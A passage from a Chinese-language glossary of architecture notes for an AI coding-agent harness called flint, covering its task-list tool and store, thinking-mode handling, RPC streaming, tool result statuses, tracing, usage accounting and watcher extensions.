它取代了改造前的"文件即状态"（模型用 `write` 维护 TASK.md、[Runtime](#runtime) 用一个正则数复选框）。两条硬不变量：① 同一时刻至多一项 `active`；② `render()` 与 `static fromMarkdown()` **严格互逆**（写盘 / 读盘是一对逆运算，否则"重启一次漂一次"，同一手法见 [Autogen Block](#autogen-block生成区) 的 `syncText`）。

参见：[todo](#todo任务清单工具)、[Runtime](#runtime)、[Agent Loop](#agent-loop)

### thinking（思维链）
让模型先推理再作答。三态开关，配在 `config/active-config.json` 的 `thinking` 键：

- `'on'` → 常开
- `'off'` → 强制关
- `'auto'` / 缺省 → 由 **Runtime** 按“有无进行中任务”判定后**按次下发**（`LLMRequestOptions.thinking`，优先级高于配置）

三个阶段：**C1** 开关与流解析（OpenAI 兼容路径的 `reasoning_content` → `reasoning` 事件，只展示、不进 fullText 与历史）；**C2** auto 判定；**C3** Anthropic 多轮回放。

C3 的关键约束：`ThinkingBlock` = 推理文本 + `signature`（Anthropic 对块内容的加密签名），**带回去的块必须一字不改**（签名校验），但只有**当前工具循环内**的块有回传义务——更早轮次的块 API 自动忽略、不计上下文，官方文档明确允许省略。它是**协议数据而非展示内容**。安全阀：assistant 历史里带 `tool_calls` 却没有对应 thinking 块时强制不开——API 对这种"历史与 thinking 不兼容"的处理是静默关 thinking。

参见：[LLMConfig](#llmconfig)、[EventStream](#eventstream推拉通道)

### todo（任务清单工具）
第 7 个内置工具，C 方案里的"**工具做接口**"：模型不再用 `write` 重抄整份清单，而是按按钮——`todo(op, index?, text?)`，`op` ∈ add / start / done / clear，参数**全是标量**（`spec.ts` 只给 5 种标量形状，也刻意不为清单开数组形状）。返回值是**渲染后带序号的整份清单**，序号即下次 `start` / `done` 要传的 `index`。

每次变更后把状态投影到 `TASK.md`（**系统行为**，不走权限弹窗）。谎报完成会留痕：`done` 走的是工具调用，进 `/traces` 与 `/history`。真相源与投影的边界见 [TaskStore](#taskstore任务清单真相源)。

参见：[TaskStore](#taskstore任务清单真相源)、[Runtime](#runtime)

### 常驻任务面板（Task Panel）
输入框正上方那块实时进度面板：完成 `✓` / 进行中 `▶` / 待办 `☐`，顶端一行 `任务 N/M`。**空清单时返回零行**——容器没子组件就不渲染，一行都不占，这就是"全部完成后立即收起"的实现方式。

它**不经过 EventBus**：`todo` 工具改的是内存里的 `TaskStore`，而工具拿不到总线（也没有事件可发），所以面板由 `TaskStore.onChange()` 这根独立的观察者线驱动。观察者是**零依赖**的（只是个回调集合），store 不必认识"UI"是什么，反过来由 UI 去 import store——`todo/` 因此守住了"零依赖 + 纯数据结构"的立身之本。

渲染实现在 `io/ui/task-panel.ts`，是**纯函数**（收 `TaskItem[]` 与 width、返回 `string[]`），所以不必起终端就能断言输出。

参见：[TaskStore](#taskstore任务清单真相源)、[todo（任务清单工具）](#todo任务清单工具)

### /tasks（任务清单回看命令）
内置命令（`commands/builtin/tasks.ts`，loader 自动扫描 `builtin/` 目录，无需登记）。有进行中任务时显示当前清单；**已清空时显示"最近一份已完成的清单"**——因为面板收起、TASK.md 又因"全勾选即删"被删掉之后，这是唯一还能看到上一轮干完了什么的入口。

快照由 `TaskStore.lastCompleted()` 提供，**记录时机是"最后一项被 `done` 的那一刻"**，不是清空时——否则半途被 `clear` 掉的清单也会被当成"已完成"存进来。

输出**刻意不带 ANSI**：命令返回值会经 RPC / 非 TTY 通道出去（编辑器插件、脚本），那里颜色转义是噪音。带颜色的版本只给终端面板用，两者共用同一个 `formatTaskList()`，所以记号不会分家。

参见：[TaskStore](#taskstore任务清单真相源)、[常驻任务面板](#常驻任务面板task-panel)

### 带摘要从此继续
`/history` 选一条消息后的新子操作（`commands/builtin/history.ts` → `Runtime.forkSessionWithSummary`）：分叉出新分支后，**立刻**把旧前缀强制压缩成"摘要 + 最近 10 条"——长对话分叉不用等下一轮阈值触发、也不必每轮背着整个前缀跑。

三段守则是它的边界：① `forkTo` 先原样复制整条前缀，**文件里永远是完整历史**（审计立场不破，压缩只改 LLM 视图）；② 前缀 ≤ 10 条时退化为普通分叉，不硬压（回执明说）；③ 摘要是否牺牲细节由用户自选——所以是菜单选项而不是自动行为。实现走 `CompactionService.compactNow`，与每轮的 `maybeCompact` 共用同一压缩主体。

参见：[Compaction](#compaction上下文压缩)、[JsonlSessionStorage](#jsonlsessionstorage)

### session/update（ACP 流式通知）

RPC 模式下 flint **主动推给外部前端**的消息（不是回答某个请求，所以**没有 id**——这正是
notification 与 response 的分界）。形状对齐 ACP：`{ jsonrpc, method: 'session/update',
params: { sessionId, update } }`，`update.sessionUpdate` 是判别式，决定对端怎么处理。

映射表在 `src/harness/rpc-events.ts`。它分**两种形状**，混成一种对端就无从判断：

| 形状 | 取值 | 对端该怎么做 | 来源事件 |
|---|---|---|---|
| **片（chunk）** | `agent_message_chunk` / `agent_thought_chunk` | **累加**到上一条后面 | `stream_text` / `stream_reasoning` |
| **离散（discrete）** | `tool_call` / `tool_call_update` / `notice` | 新建或**替换**状态 | 工具执行、thinking、error |

内部记账类事件（span / note / 自检，共 15 种）**一律不外发**——外发等于把内部实现钉成对外契约。

### stdout 纯净（RPC 模式的生命线）

`rpc.ts` 用"**一行一个 JSON**"分帧通信。混进任何非 JSON 行，对端 `JSON.parse` 就抛异常、
整条流废掉；而**犯病的进程自己毫无察觉**（写的一方一切正常，崩的是读的一方），极难排查。

规矩：`src/io/`（UI 层）随便 `console.log`——RPC 模式根本不加载它；**rpc 路径**
（`harness/` `runtime/` `loop/` `context/`）禁用 `console.log`，调试走 `console.error`
（stderr 是另一根管子，编辑器不读）或 `FLINT_DEBUG_*` 写文件。
这条由 `verify-rpc-stream.ts` ⑦ 段的**源码扫描**机器守护，不靠人记。

### ToolInputError（参数不合法错误）
`tools/spec.ts` 的导出类（`extends Error`，多一个 `code` 字段：`missing` / `unknown_param` / `invalid_type` / `invalid_range` / `empty`）。由 `parseSpec` 抛，`registry.execute()` **就地**转成 `status='invalid'` 的 [ToolResult](#toolresult结构化返回值)（构造器 `toolInvalid(e.message)`）回给模型；**不是**它的异常（规格自己写坏了）一律 `throw` 穿透——那不是模型的错，不该报成参数不合法。

它存在的理由不是“抛个错”，而是**一个会被分类、会触发保护的信号**：`agent-loop.ts` 把 invalid 计入失败（2026-09-05 起），所以同一个错参数连传两次就会注入 `[系统提示]` 叫模型别原样重试。在那之前参数错误完全落在这层保护之外（判定式是白名单，落不进任何一类就等于默认不计）。

错误文案逐字沿用改前 4 个校验件的措辞（`verify-spec.ts` ③ 段按字面钉住），所以模型侧看到的提示没变。

参见：[spec（工具参数规格）](#spec工具参数规格)、[ToolResult（结构化返回值）](#toolresult结构化返回值)、[grep（递归搜索工具）](#grep递归搜索工具)、[ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md) 2026-09-05 21:42 那块

### ToolResult（结构化返回值）
工具的返回值契约（2026-09-12 起，`core/tools.ts`）：`{ status, content }`——**机器读 status，模型读 content**。五个状态：`ok` / `negative`（有效否定，不计失败）/ `invalid` / `error` / `verify_failed`（计失败）；判定式只有 `toolStatusFails` 一份，`agent-loop` 读字段分类、不再解析前缀文本（改前 handler 返回裸字符串，前缀是工具层与消费层之间唯一的协议，拼错一个字母分类就静默漂移）。

生产端唯一入口是 `spec.ts` 的五个构造器（`toolOk` / `toolInvalid` / `toolError` / `toolVerifyFailed` / `toolNegative`）：前缀由构造器统一拼进 content，handler 只写正文——**模型可见文本与改前逐字节一致，变的只是机器通道**。有效否定的五个前缀（NOT_FOUND/NOT_DIR/NOT_FILE/NO_MATCH/EMPTY）由 `ToolNegativePrefix` 类型限定。

参见：[ToolInputError（参数不合法错误）](#toolinputerror参数不合法错误)、[Agent Loop](#agent-loop)、[ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md) 锚点 `log-2026-09-12-tool-result`

### trace.jsonl
`trace-log` watcher 的落盘产物，**一行一段完整行为**。含对话正文片段，**属隐私**，所以默认不写——必须显式设 `FLINT_TRACE=1`（`FLINT_TRACE_FILE` 可改路径，缺省项目根）。

进程退出时会把仍没关门的段补记成 `status:'unclosed'`，让“漏关门”从静默变成一眼可见。

参见：[Watcher](#watcher旁观扩展)、[CollectedSpan](#collectedspan)

### TTFT（首字延迟 / firstTokenMs）
从发出请求到收到第一个 token 的毫秒数。**只有生产端能在“收到第一个 token 那一刻”量到**，出了那个作用域就永久丢失，任何下游都重建不出来——所以它由生产端 `span.set()`，不由总线计算。

对比：`durationMs`（整段耗时，由总线在关门时用 `Date.now() - startedAt` 算）

### turnId
一次用户输入引发的全部事件共用的分组标记，由 `events.beginTurn()` 换发，同时事件序号归零。**仅在不在流式中时换发**——用户在生成期间输入的消息会走排队分支再次进入 `prompt()`，那时若换发，在飞回合的后续事件会被错误归到新组里。

参见：[EventBus](#eventbus事件总线)

### turnLog（本轮中间消息切片）
`AgentLoopResult.turnLog`（`core/loop.ts`）：agent-loop 在 `run()` 入口捕获消息数组下标，结束时把**本次循环生成**的消息切片上交——assistant（带 `tool_calls`）与 tool 结果，按发生顺序；最终回复不入内（Runtime 单独落盘）。引导/收尾提示对 tool 结果的原地追加因共享引用如实包含——**落盘即模型实际所见**。流异常轮 / 纯文本回合 turnLog 为空（没产出就不上交）。

消费方只有 Runtime：逐条带 extra 落盘（见[降级视图](#降级视图thinking-on-的历史形态)），跨轮后模型（thinking 关时回传）与 `/history` 都看得到。

参见：[Agent Loop](#agent-loop)、[Steering](#steering内层引导)

### 降级视图（thinking-on 的历史形态）
thinking 开启时跨轮历史不能回传结构化数据（`thinkingBlocks` 永不落盘，带 `tool_calls` 的历史轮没有配对块，`resolveAnthropicThinking` 安全阀会强制关 thinking）。降级是**转写不是过滤**：tool 结果转成 `[工具 X 结果] …` 的 user 文本（孤儿 tool 消息丢了 `tool_call_id` 两条协议都不认）、纯工具调用的空 assistant 轮剔除（空内容消息同样不合法）。信息保住、只丢结构。完整的取舍与骨架见 [ARCHITECTURE.md](./ARCHITECTURE.md) 第二节决策 7。

参见：[ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第 9 条 · [DECISION_LOG.md](./DECISION_LOG.md) 2026-09-12 那条

### 依赖环（Dependency Cycle）

路线图坐标的 `依赖` 列成环（如 `1.1 → 1.2 → 1.1`）。它在**格式上合法**（五列齐全、枚举正确、依赖指向存在的编号），故 `parseRoadmap` 不因它报错；但它是**死锁**——环上坐标永远等不到依赖完成，`nextCoord` 会静默返回 null，而"还剩 N 个未开始坐标"**同时成立**，读的人（含模型自己）容易理解成"活干完了"。故由 `src/project/roadmap.ts` 的 `findCycles`（DFS 三色找回边）算出，并由 [`archive` 工具](#archive坐标归档工具) 的回执**单列【依赖环】**点名（与"被依赖卡住"分开说——后者等前面做完自然通，前者再等也不会通）。代表路径归一成**编号最小者打头 + 首尾闭合**，故输入行序不影响结果；**自环**算一元环、**指向表外的依赖不算环**（那是格式错误）。见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-14-cycle-detection)。

## U

### Usage（用量）
token 消耗统计（`llm/types.ts` 的 `LLMUsage`：`promptTokens` / `completionTokens` / `totalTokens`，**只有三个槽**——Anthropic 的缓存命中率明细因此不单列，先把总量报对）。

**L3 打通后是 API 返回的真值，不再估算**：

- OpenAI 兼容路径：请求里带 `stream_options.include_usage`；撞上不支持的服务商会降级（`stream-helper.ts`）
- Anthropic 路径：`message_start` 携 input（本次请求发了多少）、`message_delta` 携 output（**累计值，不是增量**）

各轮真值经 `AgentLoopResult.usage` 汇到 `Runtime.totalUsage`，`/usage` 命令读它。

**已知缺口**：[Compaction](#compaction上下文压缩) 走非流式 `chat()`，那条路径的用量没回流，所以 `/usage` 报的数偏少。

参见：[Agent Loop](#agent-loop)

## W

### Watcher（旁观扩展）
住在 `src/extensions/watchers/`、export `registerWatchers` 的扩展。它用 `ctx.events.subscribe(handler)` 通配收全量事件、返回值没人收——**只看只录，拦不住任何人**。

与 [Hook](#hook钩子扩展) 的唯一区别就是 ctx 里少了 `on`：拿不到 `on` 就改不了流程。这条约束由类型系统兜住，不靠使用自觉；`scripts/verify-extensions.ts` 还用**探针法**断言了“watcher 实际收到的 ctx 键里确实没有 `on`”（类型在运行时被擦除，只能这样验）。

现住民：`trace-log.ts`（成段落 `trace.jsonl`）。

对比：[Hook](#hook钩子扩展)
